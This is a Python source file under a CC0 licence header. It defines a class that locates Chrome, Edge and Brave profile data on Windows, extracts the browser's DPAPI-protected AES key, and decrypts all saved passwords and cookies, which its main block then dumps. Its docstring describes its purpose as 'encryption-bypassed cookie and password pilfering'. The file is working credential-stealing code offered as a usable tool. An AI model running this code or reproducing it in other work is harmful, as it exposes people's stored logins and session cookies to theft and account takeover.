# -*- coding: utf-8 -*-
# Creative Commons Legal Code
#
# CC0 1.0 Universal
#
#     CREATIVE COMMONS CORPORATION IS NOT A LAW FIRM AND DOES NOT PROVIDE
#     LEGAL SERVICES. DISTRIBUTION OF THIS DOCUMENT DOES NOT CREATE AN
#     ATTORNEY-CLIENT RELATIONSHIP. CREATIVE COMMONS PROVIDES THIS
#     INFORMATION ON AN "AS-IS" BASIS. CREATIVE COMMONS MAKES NO WARRANTIES
#     REGARDING THE USE OF THIS DOCUMENT OR THE INFORMATION OR WORKS
#     PROVIDED HEREUNDER, AND DISCLAIMS LIABILITY FOR DAMAGES RESULTING FROM
#     THE USE OF THIS DOCUMENT OR THE INFORMATION OR WORKS PROVIDED
#     HEREUNDER.
#
# Statement of Purpose
#
# The laws of most jurisdictions throughout the world automatically confer
# exclusive Copyright and Related Rights (defined below) upon the creator
# and subsequent owner(s) (each and all, an "owner") of an original work of
# authorship and/or a database (each, a "Work").
#
# Certain owners wish to permanently relinquish those rights to a Work for
# the purpose of contributing to a commons of creative, cultural and
# scientific works ("Commons") that the public can reliably and without fear
# of later claims of infringement build upon, modify, incorporate in other
# works, reuse and redistribute as freely as possible in any form whatsoever
# and for any purposes, including without limitation commercial purposes.
# These owners may contribute to the Commons to promote the ideal of a free
# culture and the further production of creative, cultural and scientific
# works, or to gain reputation or greater distribution for their Work in
# part through the use and efforts of others.
#
# For these and/or other purposes and motivations, and without any
# expectation of additional consideration or compensation, the person
# associating CC0 with a Work (the "Affirmer"), to the extent that he or she
# is an owner of Copyright and Related Rights in the Work, voluntarily
# elects to apply CC0 to the Work and publicly distribute the Work under its
# terms, with knowledge of his or her Copyright and Related Rights in the
# Work and the meaning and intended legal effect of CC0 on those rights.
#
# 1. Copyright and Related Rights. A Work made available under CC0 may be
# protected by copyright and related or neighboring rights ("Copyright and
# Related Rights"). Copyright and Related Rights include, but are not
# limited to, the following:
#
#   i. the right to reproduce, adapt, distribute, perform, display,
#      communicate, and translate a Work;
#  ii. moral rights retained by the original author(s) and/or performer(s);
# iii. publicity and privacy rights pertaining to a person's image or
#      likeness depicted in a Work;
#  iv. rights protecting against unfair competition in regards to a Work,
#      subject to the limitations in paragraph 4(a), below;
#   v. rights protecting the extraction, dissemination, use and reuse of data
#      in a Work;
#  vi. database rights (such as those arising under Directive 96/9/EC of the
#      European Parliament and of the Council of 11 March 1996 on the legal
#      protection of databases, and under any national implementation
#      thereof, including any amended or successor version of such
#      directive); and
# vii. other similar, equivalent or corresponding rights throughout the
#      world based on applicable law or treaty, and any national
#      implementations thereof.
#
# 2. Waiver. To the greatest extent permitted by, but not in contravention
# of, applicable law, Affirmer hereby overtly, fully, permanently,
# irrevocably and unconditionally waives, abandons, and surrenders all of
# Affirmer's Copyright and Related Rights and associated claims and causes
# of action, whether now known or unknown (including existing as well as
# future claims and causes of action), in the Work (i) in all territories
# worldwide, (ii) for the maximum duration provided by applicable law or
# treaty (including future time extensions), (iii) in any current or future
# medium and for any number of copies, and (iv) for any purpose whatsoever,
# including without limitation commercial, advertising or promotional
# purposes (the "Waiver"). Affirmer makes the Waiver for the benefit of each
# member of the public at large and to the detriment of Affirmer's heirs and
# successors, fully intending that such Waiver shall not be subject to
# revocation, rescission, cancellation, termination, or any other legal or
# equitable action to disrupt the quiet enjoyment of the Work by the public
# as contemplated by Affirmer's express Statement of Purpose.
#
# 3. Public License Fallback. Should any part of the Waiver for any reason
# be judged legally invalid or ineffective under applicable law, then the
# Waiver shall be preserved to the maximum extent permitted taking into
# account Affirmer's express Statement of Purpose. In addition, to the
# extent the Waiver is so judged Affirmer hereby grants to each affected
# person a royalty-free, non transferable, non sublicensable, non exclusive,
# irrevocable and unconditional license to exercise Affirmer's Copyright and
# Related Rights in the Work (i) in all territories worldwide, (ii) for the
# maximum duration provided by applicable law or treaty (including future
# time extensions), (iii) in any current or future medium and for any number
# of copies, and (iv) for any purpose whatsoever, including without
# limitation commercial, advertising or promotional purposes (the
# "License"). The License shall be deemed effective as of the date CC0 was
# applied by Affirmer to the Work. Should any part of the License for any
# reason be judged legally invalid or ineffective under applicable law, such
# partial invalidity or ineffectiveness shall not invalidate the remainder
# of the License, and in such case Affirmer hereby affirms that he or she
# will not (i) exercise any of his or her remaining Copyright and Related
# Rights in the Work or (ii) assert any associated claims and causes of
# action with respect to the Work, in either case contrary to Affirmer's
# express Statement of Purpose.
#
# 4. Limitations and Disclaimers.
#
#  a. No trademark or patent rights held by Affirmer are waived, abandoned,
#     surrendered, licensed or otherwise affected by this document.
#  b. Affirmer offers the Work as-is and makes no representations or
#     warranties of any kind concerning the Work, express, implied,
#     statutory or otherwise, including without limitation warranties of
#     title, merchantability, fitness for a particular purpose, non
#     infringement, or the absence of latent or other defects, accuracy, or
#     the present or absence of errors, whether or not discoverable, all to
#     the greatest extent permissible under applicable law.
#  c. Affirmer disclaims responsibility for clearing rights of other persons
#     that may apply to the Work or any use thereof, including without
#     limitation any person's Copyright and Related Rights in the Work.
#     Further, Affirmer disclaims responsibility for obtaining any necessary
#     consents, permissions or other rights required for any use of the
#     Work.
#  d. Affirmer understands and acknowledges that Creative Commons is not a
#     party to this document and has no duty or obligation with respect to
#     this CC0 or use of the Work.
#
# For more information, please see
# <http://creativecommons.org/publicdomain/zero/1.0/>

import base64
import json
import os
import random
import shutil
import sqlite3
import string
import sys
from platform import system

import win32crypt
from Cryptodome.Cipher import AES


class ChromeEnumWindows:
    """Enumerates Chrome-based browser data to allow for encryption-bypassed cookie and password pilfering"""
    CHROME_DIRS = [os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data\\'),
                   os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data\\'),
                   os.path.expanduser('~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\')]
    COOKIES_DIRS = ['Default\\Cookies',
                    'Default\\Network\\Cookies']
    PASSWORD_DIRS = ['Default\\Login Data']

    def __init__(self):
        self.name = 'Chrome Enum for Windows'
        self.version = 'V1.2.1'
        if system() != "Windows":
            raise NotImplementedError(system() + " is not supported in this class.")
        base_dir_list: list = self.__get_base_dir()
        self.dir_and_key = {}
        for base_dir in base_dir_list:
            self.dir_and_key[base_dir] = self.__key_extract(base_dir)

    def __get_base_dir(self) -> list:
        base_dir = []
        for possible_path in self.CHROME_DIRS:
            if os.path.exists(possible_path):
                base_dir.append(possible_path)

        if not base_dir:
            raise FileNotFoundError('Unable to find Chrome\'s "User Data" directory.')
        return base_dir

    @staticmethod
    def __key_extract(base_dir) -> bytes:
        """Extracts AES key for the new crypto method introduced in Google Chrome V80."""
        with open(os.path.join(base_dir + 'Local State'), 'rb') as key_file_raw:
            key_file_json = json.loads(key_file_raw.read())
        key_base64 = key_file_json["os_crypt"]["encrypted_key"]
        key_protected = base64.b64decode(key_base64)[5:]  # [5:] removes header
        return win32crypt.CryptUnprotectData(key_protected, None, None, None, 0)[1]  # Removing Windows' key protection

    @staticmethod
    def __decrypter_old(data: bytes) -> bytes:
        """Decrypts Chrome-based browser data encrypted with the old method before V80.

        :param data: Encrypted data
        :return: Decrypted data
        """
        try:
            return win32crypt.CryptUnprotectData(data, None, None, None, 0)[1]
        except Exception as ex:
            print("Decryption failed. Encrypted data: ", file=sys.stderr)
            print(data, file=sys.stderr)
            print("Exception: ", file=sys.stderr)
            print(ex, file=sys.stderr)

    @staticmethod
    def __decrypter_aes(data: bytes, key: bytes) -> bytes:
        """Decrypts Chrome-based browser data encrypted with the new AES method introduced in V80.

        :param data: Encrypted data
        :return: Decrypted data
        """
        iv = data[3:15]  # The first three characters declare that this is "v10", meaning the new AES crypto.
        cipher = AES.new(key, AES.MODE_GCM, iv)
        try:
            return cipher.decrypt(data[15:])[:-16]  # Last 16 characters are extraneous, therefore removed
        except Exception as ex:
            print("Decryption failed. Encrypted data: ", file=sys.stderr)
            print(data, file=sys.stderr)
            print("Exception: ", file=sys.stderr)
            print(ex, file=sys.stderr)

    def __decrypter(self, data: bytes, key: bytes) -> bytes:
        """Determines cryptography method and returns decrypted text; raises ValueError if crypto is unrecognized.

        :param data: Encrypted data; cookies and passwords are encrypted by default.
        :return: Decrypted data.
        """
        if data[:3] == b'v10':
            return self.__decrypter_aes(data, key)
        elif data[:4] == b'\x01\0\0\0':
            return self.__decrypter_old(data)
        else:
            raise ValueError("Decryption type unknown. Please report this error. Encrypted data: " + str(data))

    def __file_and_key(self, file_list: list):
        """Returns a dictionary of files matched with corresponding key"""
        file_and_key = dict()
        for base_dir in self.dir_and_key.keys():
            for appended_dir in file_list:
                if os.path.isfile(os.path.join(base_dir, appended_dir)):
                    file_and_key[os.path.join(base_dir, appended_dir)] = self.dir_and_key[base_dir]
        return file_and_key

    def password(self) -> dict:
        """Returns a dictionary of decrypted passwords.

        Dictionary format:
        {
          'C:\\path\\to\\database':
            [
              ['url', 'username', 'password],
              ['url', 'username', 'password],
              ...
              ['url', 'username', 'password]
            ]
        }
        """
        password_dir_and_key = self.__file_and_key(self.PASSWORD_DIRS)
        if not password_dir_and_key:
            print("No passwords found.", file=sys.stderr)
        else:
            return {password_file: self.__individual_password(password_file, password_dir_and_key[password_file])
                    for password_file in password_dir_and_key}

    def __individual_password(self, database_file, key) -> list:
        """Extracts and decrypts passwords saved in Google Chrome.

        :param database_file: Absolute location of a cookie SQLite 3 database file
        :param key: Key for AES-encrypted entries
        :return: A list of lists of password entries. Each entry contains the URL, username and password, respectively.
        """
        temp_db = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        shutil.copy2(database_file, temp_db)  # Copying to avoid lock issues
        database = sqlite3.connect(temp_db)
        cursor = database.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        password_list = list()
        for row in cursor.fetchall():
            password_list.append([row[0], row[1], self.__decrypter(row[2], key)])
        database.close()
        try:
            os.remove(temp_db)
        except Exception as ex:
            if os.path.exists(temp_db):
                print(ex, file=sys.stderr)
        return password_list

    def cookies(self) -> dict:
        """ Returns dict of decrypted cookies.

        Dictionary format:
        {
          'C:\\path\\to\\database':
            (
              ('creation_utc', 'top_frame_site_key', ..., 'is_same_party'),
              [
                [row-entry-1, row-entry-2, ..., row-entry-n],
                [row-entry-1, row-entry-2, ..., row-entry-n],
                ...
                [row-entry-1, row-entry-2, ..., row-entry-n]
              ]
            )
        }
        """
        cookies_dir_and_key = self.__file_and_key(self.COOKIES_DIRS)
        if not cookies_dir_and_key:
            print("No cookies found.", file=sys.stderr)
        else:
            return {cookies_file: self.__individual_cookies(cookies_file, cookies_dir_and_key[cookies_file])
                    for cookies_file in cookies_dir_and_key}

    def __individual_cookies(self, database_file, key) -> tuple[tuple, list]:
        """Extracts and decrypts cookies saved in Chrome-based browsers given a base directory.

        The returned tuple contains the entire database, except encrypted_value is decrypted.

        :param database_file: Absolute location of a cookie SQLite 3 database file
        :param key: Key for AES-encrypted entries
        :return:  A tuple containing a tuple of column names and a nested list of the decrypted cookie database
        """
        filename = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        shutil.copy2(database_file, filename)  # Copying to avoid lock issues
        database = sqlite3.connect(filename)
        database.text_factory = bytes  # Python arbitrarily interprets BLOB fields as str and crashes everything,
        #                                 so this is the workaround.
        cursor = database.cursor()
        cursor.execute("SELECT * FROM cookies")
        decrypted_database = list()
        columns = [fields[0] for fields in cursor.description]
        for row in cursor.fetchall():
            row = list(row)
            row[columns.index("encrypted_value")] = self.__decrypter(row[columns.index("encrypted_value")], key)
            decrypted_database.append(row)
        database.close()
        try:
            os.remove(filename)
        except Exception as ex:
            if os.path.exists(filename):
                print(ex, file=sys.stderr)

        columns[columns.index("encrypted_value")] = "decrypted_value"

        return tuple(columns), decrypted_database  # Returning the columns as a tuple as columns should be immutable


if __name__ == "__main__":
    c = ChromeEnumWindows()
    print(c.name)
    print(c.version)
    print("Dumping passwords...")
    passwords = c.password()
    for password_database in passwords.keys():
        print(password_database)
        print(passwords[password_database])
    print()
    print("Dumping cookies...")
    cookies = c.cookies()
    for cookie_database in cookies.keys():
        print(cookie_database)
        print(cookies[cookie_database][0])
        for cookie_entry in cookies[cookie_database][1]:
            print(cookie_entry)
